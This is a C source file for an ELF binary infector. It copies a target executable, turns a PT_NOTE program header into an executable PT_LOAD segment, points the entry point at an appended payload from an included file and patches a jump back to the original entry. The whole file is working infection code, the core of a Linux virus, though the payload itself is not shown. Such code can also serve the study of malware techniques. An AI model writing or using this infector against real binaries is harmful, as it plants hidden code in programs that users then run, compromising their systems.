#include <fcntl.h>
#include <libelf.h>
#include <linux/limits.h>
#include <stddef.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

#include "payload.c"

int main(int argc, char *argv[])
{
	if (argc != 2)
		return 1;

	char *target = argv[1];
	printf("Target file: %s\n", target);

	char target_copy[PATH_MAX] = {0};
	{
		snprintf(target_copy, sizeof(target_copy), "%s_infected", target);
		char buffer[4096] = {0};
		FILE *f = fopen(target, "r");
		FILE *f_copy = fopen(target_copy, "w");
		while (!feof(f)) {
			int read_size = fread(buffer, 1, sizeof(buffer), f);
			fwrite(buffer, 1, read_size, f_copy);
		}
		fclose(f);
		fclose(f_copy);
		chmod(target_copy, 0766);
	}
	printf("New path: %s\n", target_copy);

	int fd = open(target_copy, O_RDWR);
	size_t fdsz = lseek(fd, 0, SEEK_END);
	lseek(fd, 0, SEEK_SET);

	elf_version(EV_CURRENT);

	Elf *elf = elf_begin(fd, ELF_C_READ, NULL);

	Elf64_Ehdr *ehdr = elf64_getehdr(elf);

	long old_entry = ehdr->e_entry;

	size_t phdrnum;
	elf_getphdrnum(elf, &phdrnum);

	Elf64_Phdr *phdr = elf64_getphdr(elf);

	for (size_t i = 0; i < phdrnum; i++) {
		if (phdr[i].p_type != PT_NOTE) {
			continue;
		}

		phdr[i].p_type = PT_LOAD;
		phdr[i].p_flags = PF_R | PF_X;
		phdr[i].p_vaddr = 0xc000000 + fdsz;
		phdr[i].p_paddr = 0xc000000 + fdsz;
		phdr[i].p_memsz = payload_len;
		phdr[i].p_filesz = payload_len;
		phdr[i].p_offset = fdsz;
		phdr[i].p_align = 0x1000;

		ehdr->e_entry = phdr[i].p_vaddr;

		lseek(fd, 0, SEEK_SET);
		write(fd, ehdr, sizeof(Elf64_Ehdr));

		lseek(fd, ehdr->e_phoff + (sizeof(Elf64_Phdr) * i), SEEK_SET);
		write(fd, &phdr[i], sizeof(Elf64_Phdr));

		int payload_to_start = old_entry - (phdr[i].p_vaddr + payload_len);
		*(int *)(payload + payload_len - 4) = payload_to_start;

		lseek(fd, 0, SEEK_END);
		write(fd, payload, payload_len);

		break;
	}

	elf_end(elf);

	return 0;
}
